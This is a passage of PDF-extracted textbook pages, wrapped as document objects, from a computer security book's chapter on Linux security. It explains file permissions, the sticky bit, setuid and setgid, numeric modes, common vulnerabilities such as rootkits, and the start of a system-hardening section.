       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 805, 'page_label': '25-4'}, page_content='25-4  CHAPTER 25 /  Linux SECuRiTy\\n 25.3 THE LINUX DAC IN DEPTH: FILE-SYSTEM SECURITY\\nSo far, we haven’t said anything about memory, device drivers, named pipes, and other \\nsystem resources. Isn’t there more to system security than users, files, and directories? \\nYes and no: In a sense, Linux treats everything as a file.\\nDocuments, pictures, and even executable programs are very easy to conceptu-\\nalize as files on your hard disk. But although we think of a directory as a container of \\nfiles, in UNIX a directory is actually itself a file containing a list of other files.\\nSimilarly, the CD-ROM drive attached to your system seems tangible enough, \\nbut to the Linux kernel, it is a file: the “special” device-file/dev/cdrom. To send \\ndata from or write data to the CD-ROM drive, the Linux kernel actually reads to and \\nwrites from this special file. (Actually, on most systems, “/dev/cdrom” is a symbolic \\nlink to /dev/hdb or some other special file, and a symbolic link is in turn nothing \\nmore than a file that contains a pointer to another file.)\\nOther special files, such as named pipes, act as input/output (I/O) “conduits,” \\nallowing one process or program to pass data to another. One common example of a \\nnamed pipe on Linux systems is /dev/urandom: When a program reads this file, /dev/\\nurandom returns random characters from the kernel’s random number generator.\\nThese examples illustrate how in Linux/UNIX, nearly everything is represented \\nby a file. Once you understand this, it’s much easier to understand why file-system \\nsecurity is so important (and how it works).\\nUsers, Groups, and Permissions\\nThere are two things on a UNIX system that aren’t represented by files: user accounts \\nand group accounts, which, for short, we can call users and groups. (Various files con-\\ntain information about a system’s users and groups, but none of those files actually \\nrepresents them.)\\nA user account represents someone or something capable of using files. As we \\nsaw in the previous section, a user account can be associated both with actual human \\nbeings and with processes. The standard Linux user account “lp,” for example, is used \\nby the Line Printer Daemon (lpd): the lpd program runs as the user lp.\\nA group account is simply a list of user accounts. Each user account is defined \\nwith a main group membership, but may in fact belong to as many groups as you want \\nor need it to. For example, the user “maestro” may have a main group membership \\nin “conductors” and also belong to the group “pianists.”\\nA user’s main group membership is specified in the user account’s entry in /etc/\\npassword; you can add that user to additional groups by editing /etc/group and \\nadding the username to the end of the entry for each group the user needs to belong \\nto, or via the usermod command (see the usermod(8) manpage for more information).\\nListing 25-1 shows “maestro”‘s entry in the file /etc/password, and \\n Listing\\xa025-2 shows part of the corr\\nesponding /etc/group file:\\nListing 25-1: An /etc/password Entry for the User “maestro” \\nmaestro:x:200:100:Maestro Edward Hizzersands:/home \\n/maestro:/bin/bash\\nM25_STAL0611_04_GE_C25.indd   4 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 806, 'page_label': '25-5'}, page_content='25.3 / THE Linux DAC in DEPTH: FiLE-SySTEM SECuRiTy  25-5\\nIn Listing 25-1, we see that the first field contains the name of the user account, \\n“maestro;” the second field (“x”) is a placeholder for maestro’s password (which is \\nactually stored in /etc/shadow); the third field shows maestro’s numeric user-ID \\n(or “uid,” in this case “200”); and the fourth field shows the numeric group-ID (or \\n“gid,” in this case “100”) of maestro’s main group membership. The remaining fields \\nspecify a comment, maestro’s home directory, and maestro’s default login shell.\\nIn Listing 25-2, from /etc/group, each line simply contains a group-name, a \\ngroup-password (usually unused — “x” is a placeholder), and numeric group-ID (gid), \\nand a comma-delimited list of users with “secondary” memberships in the group. Thus, \\nwe see that the group “conductors” has a gid of “100” , which corresponds to the gid \\nspecified as maestro’s main group in Listing 25-1; and also that the group “pianists” \\nincludes the user “maestro” (plus another named “volodya”) as a secondary member.\\nThe simplest way to modify /etc/password and /etc/group in order to \\n create\\n, modify, and delete user accounts is via the commands useradd, usermod, and \\nuserdel, respectively. All three of these commands can be used to set and modify \\ngroup- memberships,\\n and all three commands are well documented in their respective \\n manpages. (To see a quick usage summary, you can also type the command followed \\nby “--help,” for example, “useradd --help”. )\\nSo we’ve got user accounts, which are associated with different group accounts. \\nJust what is all this good for?\\nSimple File Permissions\\nEach file on a UNIX system (which, as we’ve seen, means practically every single \\nthing on a UNIX system) has two owners: a user and a group, each with its own set \\nof permissions that specify what the user or group may do with the file (read it, write \\nto it, or delete it, and execute it). A third set of permissions pertains to other, that is, \\nuser accounts that don’t own the file or belong to the group that owns it.\\nListing 25-3 shows a “long file-listing” for the file /home/maestro/baton_ \\ndealers.txt:\\nListing 25-2: Two /etc/group Entries \\nconductors:x:100:\\npianists:x:102:maestro,volodya\\nListing 25-3: File-Listing Showing Permissions \\n-rw-rw-r-- 1 maestro conductors 35414 Mar 25 01:38  \\nbaton_dealers.txt\\nPermissions are listed in the order “user permissions, group permissions, other \\npermissions.” Thus, we see that for the file shown in Listing 25-3, its user-owner \\n(“maestro”) may read and write/delete the file (“rw-”); its group-owner (“conduc-\\ntors”) may also read and write/delete the file (“rw-”); but that other users (who are \\nneither “maestro” nor members of “conductors”) may only read the file.\\nM25_STAL0611_04_GE_C25.indd   5 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 807, 'page_label': '25-6'}, page_content='25-6  CHAPTER 25 /  Linux SECuRiTy\\nThere’s a third permission besides “read” and “write”: “execute,” denoted by \\n“x” (when set). If maestro writes a shell script named “punish_bassoonists.sh”,  \\nand if he sets its permissions to “-rwxrw-r--” , then maestro will be able to execute his \\nscript by entering the name of the script at the command line. If, however, he forgets \\nto do so, he won’t be able to run the script, even though he owns it. Permissions are \\nusually set via the chmod command (short for “change mode”).\\nDirectory Permissions\\nDirectory permissions work slightly differently from permissions on regular files. \\n“Read” and “write” are similar; for directories these permissions translate to “list \\nthe directory’s contents” and “create or delete files within the directory” , respec-\\ntively. “Execute” is less intuitive; for directories, “execute” translates to “use anything \\nwithin or change working directory to this directory.”\\nThat is, if a user or group has execute permissions on a given directory, the \\nuser or group can list that directory’s contents, read that directory’s files (assuming \\nthose individual files’ own permissions include this), and change its own working \\ndirectory to that directory, as with the command “cd” . If a user or group does not \\nhave execute permissions on a given directory, its permissions will be unable to list \\nor read anything in it, regardless of the permissions set on the things inside.\\n(Note if you lack execute permissions on a directory, but do have read permis-\\nsions on the directory, and you try to list its contents with ls, you will receive an error \\nmessage that, in fact, lists the directory’s contents. But this doesn’t work if you have \\nneither read nor execute permissions on the directory.)\\nSuppose our example system has a user named biff who belongs to the group \\n“drummers” . And suppose further his home directory contains a directory named, \\nextreme_casseroles that biff wishes to share with his fellow percussionists. \\n Listing\\xa025-4 shows how biff might set that directory’s permissions:\\nListing 25-4: A Group-Readable Directory \\nbash-$ chmod g+rx extreme_casseroles   \\nbash-$ ls -l extreme_casseroles\\ndrwxr-x--- 8 biff drummers 288 Mar 25 01:38  \\nextreme_casseroles\\nPer Listing 25-4, only biff has the ability to create, change, or delete files inside \\nextreme_casseroles. Other members of the group “drummers” may list its contents \\nand cd to it. Everyone else on the system, however (except root, who is always all pow-\\nerful), is blocked from listing, reading, cd-ing, or doing anything else with the directory.\\nThe Sticky Bit\\nSuppose our drummer friend Biff wants to allow his fellow drummers not only to \\nread his recipes, but also to add their own. As we saw last time, all he needs to do is \\nset the “group-write” bit for this directory, like this:\\nchmod g+w ./extreme_casseroles\\nM25_STAL0611_04_GE_C25.indd   6 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 808, 'page_label': '25-7'}, page_content=\"25.3 / THE Linux DAC in DEPTH: FiLE-SySTEM SECuRiTy  25-7\\nThere’s only one problem with this: “write” permissions include not only the \\nability to create new files in this directory, but also to delete them. What’s to stop one \\nof his drummer pals from deleting other people’s recipes? The “sticky bit.”\\nIn older UNIX operating systems, the sticky bit was used to write a file  (p\\nrogram) \\nto memory so it would load more quickly when invoked. On Linux, however, it serves \\na different function: When you set the sticky bit on a directory, it limits users’ ability \\nto delete things in that directory. With the sticky bit set, to delete a given file in the \\ndirectory, it is not sufficient that group-write permissions are set on the directory, and \\nyou belong to the group that owns the directory. Rather, to delete a file in a directory \\nwith the sticky bit set, you must either own that file or own the directory.\\nTo set the sticky bit, issue the command\\nchmod +t  directory_name \\nIn our example, this would be “chmod +t extreme_casseroles”. If we \\nset\\xa0the sticky bit on extreme_casseroles then do a long listing of the directory itself, \\nusing “ls -ld extreme_casseroles” , we’ll see\\ndrwxrwx--T 8 biff drummers 288 Mar 25 01:38 \\nextreme_casseroles\\nNote the “T” at the end of the permissions string. We’d normally expect to see \\neither “x” or “-” there, depending on whether the directory is “other-writable” . “T” \\ndenotes that the directory is not “other-executable” but has the sticky bit set. A lower-\\ncase “t” would denote that the directory is other-executable and has the sticky bit set.\\nTo illustrate what effect this has, suppose a \\nlisting of the contents of extreme_\\ncasseroles/ looks like this (see Listing 25-5):\\nListing 25-5: Contents of extreme_casseroles/ \\ndrwxrwxr-T 3 biff drummers 192 2004-08-10 23:39 .\\ndrwxr-xr-x 3 biff drummers 4008 2004-08-10 23:39 ..\\n-rw-rw-r-- 1 biff drummers   18 2004-07-08 07:40  \\nchocolate_turkey_casserole.txt\\n-rw-rw-r-- 1 biff drummers   12 2004-08-08 15:10  \\npineapple_mushroom_suprise.txt\\ndrwxr-xr-x 2 biff drummers   80 2004-08-10 23:28 src\\nSuppose further the user “crash” tries to delete the recipe-file  pineapple_\\nmushroom_surprise.txt, which crash finds offensive. crash expects this to work, \\nbecause he belongs to the group “drummers” and the group-write bit is set on this file.\\nHowever, remember, biff just set the parent directory’s sticky bit. crash’s \\nattempted deletion will fail, as we see in \\nListing 25-6 (user input in boldface):\\nListing 25-6: Attempting Deletion with Sticky Bit Set \\ncrash@localhost:/extreme_casseroles>  \\nrm pineapple_mushroom_suprise.txt  \\nrm: cannot remove 'pineapple_mushroom_suprise.txt':  \\nOperation not permitted\\nM25_STAL0611_04_GE_C25.indd   7 10/11/17   3:21 PM\"),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 809, 'page_label': '25-8'}, page_content='25-8  CHAPTER 25 /  Linux SECuRiTy\\nThe sticky bit only applies to the directory’s first level downward. In Listing 25-5, \\nyou may have noticed that besides the two nasty recipes, extreme_casseroles/ \\nalso contains another directory, “src”. The contents of src will not be affected by  \\nextreme_casserole’s sticky bit (though the directory src itself will be). If biff wants \\nto protect src’s contents from group deletion, he’ll need to set src’s own sticky bit.\\nSetuid and Setgid\\nNow, we come to two of the most dangerous permissions bits in the UNIX world: \\nsetuid and segid. If set on an executable binary file, the setuid bit causes that program \\nto run as its owner, no matter who executes it. Similarly, the setgid bit, when set on an \\nexecutable, causes that program to run as a member of the group that owns it, again \\nregardless of who executes it.\\nBy run as, we mean “to run with the same privileges as.” For example, sup-\\npose biff writes and compiles a C program, “killpineapple” , that behaves the \\nsame as the command “rm /extreme_casseroles/pineapple_mushroom_ \\nsurprise.txt” . Suppose further biff sets the setuid bit on killpineapple, with the \\ncommand ;chmod +s ./killpineapple<, and also makes it group executable. \\nA long-listing of killpineapple might look like this:\\n-rwsr-xr-- 1 biff drummers 22 2004-08-11 23:01 \\nkillpineapple\\nIf crash runs this program he will finally succeed in his quest to delete the \\n Pineapple Mushroom Surprise r\\necipe: killpineapple will run as though biff had \\nexecuted it. When killpineapple attempts to delete pineapple_ mushroom_\\ns\\nuprise.txt , it will succeed because the file has user-write permissions and \\n killpineapple is acting as its user-owner\\n, biff.\\nNote that setuid and setgid are very dangerous if set on any file owned by root or \\nany other privileged account or group. We illustrate setuid and setgid in this discussion \\nso you understand what they do, not because you should actually use them for anything \\nimportant. The command “sudo” is a much better tool for delegating root’s authority.\\nAlso note that if you want a program to run setuid, that program must be group-\\nexecutable or other-executable, for obvious reasons. Note the Linux kernel ignores \\nthe setuid and setgid bits on shell scripts; these bits only work on binary (compiled) \\nexecutables.\\nSetgid works the same way, but with group permissions: If you set the setgid bit \\non an executable file via the command “chmod g+s filename”, and if the file is \\nalso “other-executable” (-r-xr-sr-x), then when that program is executed, it will run \\nwith the group-ID of the file rather than of the user who executed it.\\nIn the preceding example, if we change killpineapple’s “other” permis -\\nsions to “r-x” (chmod o+x killpineapple) and make it setgid (chmod g+s \\n killpineapple\\n), then no matter who executes killpineapple,  killpineapple \\nwi\\nll exercise the permissions of the “drummers” group, because drummers is the \\ngroup-owner of killpineapple.\\nSetgid and Directories\\nSetuid has no effect on directories, but setgid does.  Normally,  when you create a file, \\nit’s automatically owned by your user-ID and your (primary) group-ID. For example, \\nM25_STAL0611_04_GE_C25.indd   8 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 810, 'page_label': '25-9'}, page_content='25.3 / THE Linux DAC in DEPTH: FiLE-SySTEM SECuRiTy  25-9\\nif biff creates a file, the file will have a user-owner of “biff” and a group-owner of \\n“drummers” (assuming that “drummers” is biff’s  primary group\\n, as listed in /etc \\n/passwd).\\nSetting a directory’s setgid bit, however, causes any file created in that directory \\nto inherit the directory’s group-owner. This is useful if users on your system tend to \\nbelong to secondary groups and routinely create files that need to be shared with \\nother members of those groups.\\nFor example, if the user “animal” is listed in /etc/group as being a second-\\nary member of “drummers” but is listed in /etc/passwd has having a primary \\ngroup of “muppets” , then animal will have no trouble creating files in the extreme_ \\ncasseroles/ dir\\nectory, whose permissions are set to drwxrwx--T. However, by \\ndefault, animal’s files will belong to the group muppets, not to drummers, so unless \\nanimal manually reassigns his files’ group-ownership (chgrp drummers newfile) \\nor resets their other-permissions (chmod o+rw newfile), then other members of \\ndrummers won’t be able to read or write animal’s recipes.\\nIf, on the other hand, biff (or root) sets the setgid bit on extreme_casseroles/  \\n(chmod g+s extreme_casseroles), then when animal creates a new file \\ntherein, the file will have a group-owner of “drummers” , just like extreme_  \\ncasseroles/ itself\\n. Note that all other permissions still apply: If the directory in \\nquestion isn’t group-writable, then the setgid bit will have no effect (because group \\nmembers won’t be able to create files inside it).\\nNumeric Modes\\nSo far, we’ve been using mnemonics to represent permissions: “r” for read, “w” for \\nwrite, and so on. But internally, Linux uses numbers to represent permissions; only \\nuser-space programs display permissions as letters. The chmod command recognizes \\nboth mnemonic permission modifiers (;u+rwx, go@w<) and numeric modes.\\nA numeric mode consists of four digits: as you read left to right, these repre-\\nsent special permissions, user permissions, group permissions, and other permissions \\n(where, you’ll recall, “other” is short for “other users not covered by user permissions \\nor group permissions”). For example, 0700 translates to “no special permissions set, \\nall user permissions set, no group permissions set, no other permissions set.”\\nEach permission has a numeric value, and the permissions in each digit-place \\nare additive: The digit represents the sum of all permission-bits you wish to set. If, for \\nexample, user permissions are set to “7” , this represents 4 (the value for “read”) plus\\xa02 \\n(the value for “write”) plus 1 (the value for “execute”).\\nAs just mentioned, the basic numeric values are 4 for read, 2 for write, and 1 for \\nexecute. (I remember these by mentally repeating the phrase, “read-write-execute, \\n4-2-1.”) Why no “3,” you might wonder? Because (a) these values represent bits in a \\nbinary stream and are therefore all powers of 2, and (b) this way, no two combinations \\nof permissions have the same sum.\\nSpecial permissions are as follows: 4 stands for setuid, 2 stands for setgid, and \\n1 stands for sticky bit. For example, the numeric mode 3000 translates to “setgid set, \\nsticky bit set, no other permissions set” (which is, actually, a useless set of permissions).\\nHere’s one more example of a numeric mode. If I issue the command \\n“chmod 0644 mycoolfile,” I’ll be setting the permissions of “mycoolfile ” \\nas shown in F\\nigure 25.2.\\nM25_STAL0611_04_GE_C25.indd   9 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 811, 'page_label': '25-10'}, page_content='25-10  CHAPTER 25 /  Linux S EC u R i T y\\nFor a more complete discussion of numeric modes, see the Linux “info” \\npage for “coreutils,” node “Numeric Modes” (that is, enter the command “info \\ncoreutils numeric”).\\nKernel Space versus User Space\\nIt is a simplification to say that users, groups, files, and directories are all that matter \\nin the Linux DAC: Memory is important, too. Therefore, we should at least briefly \\ndiscuss kernel space and user space.\\nKernel space refers to memory used by the Linux kernel and its loadable \\n modules (e\\n.g., device drivers). User space refers to memory used by all other \\n pr\\nocesses. Because the kernel enforces the Linux DAC and, in real terms, dictates \\nsystem reality, it’s extremely important to isolate kernel space from user space. For \\nthis reason, kernel space is never swapped to hard disk.\\nIt’s also the reason that only root may load and unload kernel modules. As we’re \\nabout to see, one of the worst things that can happen on a compromised Linux system \\nis for an attacker to gain the ability to load kernel modules.\\n 25. 4  LINUX VULNERABILITIES\\nIn this section, we’ll discuss the most common weaknesses in Linux systems.\\nFirst, a bit of terminology. A vulnerability is a specific weakness or security-\\nrelated bug in an application or operating system. A threat is the combination of a \\nvulnerability, an attacker, and a means for the attacker to exploit the vulnerability \\n(called an attack vector).\\nHistorically, some of the most common and far-reaching vulnerabilities in \\ndefault Linux installations (unpatched and unsecured) have been:\\n•\\n Buf\\nfer overflows,\\n•\\n R\\nace conditions,\\n•\\n Abuse of pr\\nograms run “setuid root” ,\\n•\\n Denial of service (DoS),\\n•\\n W\\neb application vulnerabilities, and\\n•\\n R\\nootkit attacks.\\nWhile you’ve already had exposure to most of these concepts earlier in this text, \\nlet’s take a closer look at how several of them apply to Linux.\\nFigure 25.2 P ermissions on mycoolfile\\n0\\nno special permissions set\\nuser-owner may read or write to the ﬁle (6 = 4 + 2)\\ngroup-owners may read the ﬁle\\n“other” users may read the ﬁle\\n6 4 4\\nM25_STAL0611_04_GE_C25.indd   10 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 812, 'page_label': '25-11'}, page_content='25.4 / Linux VuLnERABiLiTiES  25-11\\nAbuse of Programs Run “setuid root”\\nAs we discussed in the previous section, any program whose setuid permission bit is \\nset will run with the privileges of the user that owns it, rather than those of the process \\nor the user executing it. A setuid root program is a root-owned program with its setuid \\nbit set; that is, a program that runs as root no matter who executes it.\\nIf a setuid root program can be exploited or abused in some way (e.g., via a \\n buffer overflow vulner\\nability or race condition), then otherwise unprivileged users \\nmay be able to use that program to wield unauthorized root privileges, possibly \\nincluding opening a root shell (a command-line session running with root privileges).\\nRunning setuid root is necessary for programs that need to be run by \\nunprivileged users yet must provide such users with access to privileged functions \\n(e.g.,\\xa0 changing their password, which requires changes to protected system files). But \\nsuch a program must be programmed very carefully, with impeccable user-input vali-\\ndation, strict memory management, and so on. That is, the program must be designed \\nto be run setuid (or setgid) root. Even then, a root-owned program should only have \\nits setuid bit set if absolutely necessary.\\nDue to a history of abuse against setuid root programs, major Linux distribu-\\ntions no longer ship with unnecessary setuid-root programs. But system attackers \\nstill scan for them.\\nWeb Application Vulnerabilities\\nThis is a very broad category of vulnerabilities, many of which also fall into other cat-\\negories in this list. It warrants its own category because of the ubiquity of the World \\nWide Web: there are few attack surfaces as big and visible as an Internet-facing Website.\\nWhile Web applications written in scripting languages such as PHP , Perl, and \\nJava may not be as prone to classic buffer overflows (thanks to the additional layers \\nof abstraction presented by those languages’ interpreters), they’re nonetheless prone \\nto similar abuses of poor input-handling, including cross-site scripting, SQL code \\ninjection, and a plethora of other vulnerabilities described in depth by the Open Web \\nApplication Security Project on the Project’s website (http://www.owasp.org).  \\nWe discussed a number of these in \\nChapter 11.\\nNowadays, few Linux distributions ship with “enabled-by-default” Web applica-\\ntions (such as the default cgi scripts included with older versions of the Apache Web \\nServer). However, many users install Web applications with known vulnerabilities, \\nor write custom Web applications having easily identified and easily exploited flaws.\\nRootkit Attacks\\nThis attack, which allows an attacker to cover his or her tracks, typically occurs after \\nroot compromise: If a successful attacker is able to install a rootkit before being \\ndetected, all is very nearly lost.\\nRootkits began as collections of “hacked replacements” for common UNIX \\ncommands (ls, ps, etc.) that behaved like the legitimate commands they replaced, \\nexcept for hiding an attacker’s files, directories, and processes. For example, if an \\nattacker was able to replace a compromised Linux system’s ls command with a root-\\nkit version of ls, then anyone executing the ls command to view files and directories \\nwould see everything except the attacker’s files and directories.\\nM25_STAL0611_04_GE_C25.indd   11 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 813, 'page_label': '25-12'}, page_content='25-12  CHAPTER 25 /  Linux SECuRiTy\\nIn the Linux world, since the advent of loadable kernel modules (LKMs), root-\\nkits have more frequently taken the form of LKMs. This is particularly devious: An \\nLKM rootkit does its business (covering the tracks of attackers) in kernel space, \\nintercepting system calls pertaining to any user’s attempts to view the intruder’s \\nresources.\\nIn this way, files, directories, and processes owned by an attacker are hidden \\neven to a compromised system’s standard, untampered-with commands, including \\ncustomized software. Besides operating at a lower, more global level, another advan-\\ntage of the LKM rootkit over traditional rootkits is that system integrity checking \\ntools such as Tripwire won’t generate alerts from system commands being replaced.\\nLuckily, even LKM rootkits do not always ensure complete invisibility for \\nattackers. Many traditional and LKM rootkits can be detected with the script \\n chkrootkit\\n, available at www.chkrootkit.org. In general, however, if an attacker \\ngets far enough to install an LKM rootkit, your system can be considered to be com-\\npletely compromised; if and when you detect the breach (e.g., via a defaced website, \\nmissing data, suspicious network traffic), the only way to restore your system with \\nany confidence of completely shutting out the intruder will be to erase its hard disk \\n(or replace it, if you have the means and inclination to analyze the old one), reinstall \\nLinux, and apply all the latest software patches.\\n 25.5 LINUX SYSTEM HARDENING\\nWe’ve seen how Linux security is supposed to work, and how it most typically fails. \\nThe remainder of this chapter will focus on how to mitigate Linux security risks at the \\nsystem and application levels. We follow the broad outline introduced in  Chapter\\xa012 \\nfor hardening an operating system and applications, but focus on applying this to \\nLinux/UNIX systems. This section deals with the first of these: OS-level security \\ntools and techniques that protect the entire system. The final section in this chapter, \\non mandatory access controls, also describes system-level controls, but because this \\nis both an advanced topic and an emerging technology (in the Linux world), we’ll \\nconsider it separately from the more fundamental controls in this section.\\nOS Installation: Software Selection and Initial Setup\\nLinux system security begins at operating system installation time: one of the most \\ncritical, system-impacting decisions a system administrator makes is what software \\nwill run on the system. Because it’s hard enough for the typical, commonly over-\\nworked system administrator to find the time to secure a system’s critical applications, \\nan unused application is liable to be left in a default, unhardened and unpatched state. \\nTherefore, it’s very important that from the start, careful consideration be given to \\nwhich applications should be installed, and which should not.\\nWhat software should you not install? Common sense should be your guide: for \\nexample, an SMTP (e-mail) relay shouldn’t need the Apache Web Server; a database \\nserver shouldn’t need an office productivity suite such as OpenOffice; and so on.\\nGiven the plethora of roles Linux systems play (desktops, servers, laptops, fire-\\nwalls, embedded systems, to name just a few), it’s impossible to do much more than \\ngeneralize in enumerating what software one shouldn’t install. Nonetheless, here is a \\nM25_STAL0611_04_GE_C25.indd   12 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 814, 'page_label': '25-13'}, page_content='25.5 / Linux SySTEM HARDE nin G   25-13\\nlist of software packages that should seldom, if ever, be installed on hardened servers, \\nespecially Internet-facing servers:\\n•\\n X W\\nindow System:  Servers ar\\ne usually remotely controlled via the Secure \\nShell, not locally via standard desktop sessions. Even if they are, X’s history \\nof security vulnerabilities makes plaintext-console sessions a safer choice for \\nlocal access.\\n•\\n RPC Services:  R\\nemote Procedure Call is a great convenience for developers, \\nbut both difficult to track through firewalls and too reliant on the easily spoofed \\nUDP protocol.\\n•\\n R-Services:  rsh,\\n rlogin, and rcp use only cleartext authentication (which can \\nbe eavesdropped) or source-IP-address-based authentication (which can some-\\ntimes be spoofed). The Secure Shell (SSH), which uses strong encryption, was \\ncreated specifically to replace these commands, and should be used instead.\\n•\\n inetd:  \\nThe Internet Daemon (inetd) is a poorly scaling means of starting criti-\\ncal network daemons, which should instead be started autonomously. inetd also \\ntends, by default, to leave various unnecessary and potentially insecure services \\nenabled, including RPC applications.\\n•\\n SMTP Daemons:  \\nTraditionally, the Simple Mail Transport Protocol (SMTP) \\ndaemon Sendmail is enabled by default on many Linux distributions, despite \\nSendmail’s history of security problems. More recent systems have replaced it \\nwith Postfix, a much more secure SMTP mail server that should be used if mail \\nrelay services are required. Such a server is unnecessary though, on any system \\nthat doesn’t need to receive relayed e-mail.\\n•\\n T\\nelnet and other cleartext-logon services:  Because it passes logon cr\\nedentials \\n(usernames and passwords) over the network unencrypted, exposing them to \\neavesdroppers, telnet is no longer a viable tool for remote system access (and \\ncertainly not remote administration) via untrusted networks. The Secure Shell \\n(SSH) is almost always a better choice than telnet. FTP , POP3, and IMAP also \\nexpose user credentials in this way, though many modern FTP , POP3, and IMAP \\nserver applications now support SSL or TLS encryption.\\nIn addition to initial software selection and installation, Linux installation \\nutilities also perform varying amounts of initial system and software configuration, \\nincluding some or all of the following:\\n•\\n Set\\nting the root password\\n•\\n Cr\\neating a non-root user account\\n•\\n Set\\nting an overall system security level (usually influencing initial file-permission \\nsettings)\\n•\\n Enabling a simple host-based fir\\newall policy\\n•\\n Enabling SELinux or Novell \\nAppArmor (see Section 25.7)\\nPatch Management\\nCarefully selecting what gets installed (and what doesn’t get installed) on a Linux \\nsystem is an important first step in securing it. All the server applications you do \\nM25_STAL0611_04_GE_C25.indd   13 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 815, 'page_label': '25-14'}, page_content='25-14  CHAPTER 25 /  Linux SECuRiTy\\ninstall, however, must be configured securely (the subject of Section 25.6), and they \\nmust also be kept up to date with security patches.\\nThe bad news with patching is that you can never win the “patch rat-race”: \\nThere will always be software vulnerabilities that attackers are able to exploit for \\nsome period of time before vendors issue patches for them. (As yet unpatchable \\nvulnerabilities are known as zero-day, or 0-day, vulnerabilities.)\\nThe good news is that modern Linux distributions usually include tools for \\nautomatically downloading and installing security updates, which can minimize the \\ntime your system is vulnerable to threats against which patches are available. For \\nexample, Red Hat, Fedora, and CentOS include up2date (YUM can be used instead); \\nSuSE includes YaST Online Update; and Debian uses apt-get, though you must run \\nit as a cron job for automatic updates.\\nNote on 